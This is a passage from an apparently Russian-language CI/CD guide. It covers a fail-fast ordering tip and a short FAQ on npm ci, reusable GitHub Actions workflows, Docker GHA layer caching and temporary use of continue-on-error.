3.  **Fail Fast:** Ставь самые быстрые и дешевые проверки (Lint) в начало. Нет смысла запускать тяжелые тесты или сборку Docker-образа, если код не прошел проверку стиля.

## ❓ FAQ (Частые вопросы)

**В: Почему `npm ci` лучше, чем `npm install` в CI?**
**О:** `npm install` может обновить твой `package-lock.json`, что приведет к непредсказуемым версиям зависимостей. `npm ci` строго следует локу и работает быстрее, так как не пытается разрешать зависимости заново.

**В: Как мне сделать один шаблон для 10 разных репозиториев?**
**О:** Используй **Reusable Workflows**. Ты создаешь один workflow в специальном репозитории, а остальные просто вызывают его через `uses: owner/repo/.github/workflows/template.yml@main`.

**В: Зачем использовать `cache-from: type=gha` в Docker?**
**О:** Обычный кэш Docker сохраняется внутри одной сессии. `type=gha` позволяет GitHub Actions сохранять слои образа в свой внутренний кэш, что делает последующие сборки невероятно быстрыми даже после полной очистки раннера.

**В: Что делать, если тесты падают, но я хочу увидеть логи билда?**
**О:** Используй параметр `continue-on-error: true` для шага с тестами. Но помни: это плохая практика для Production, используй только для временной отладки.
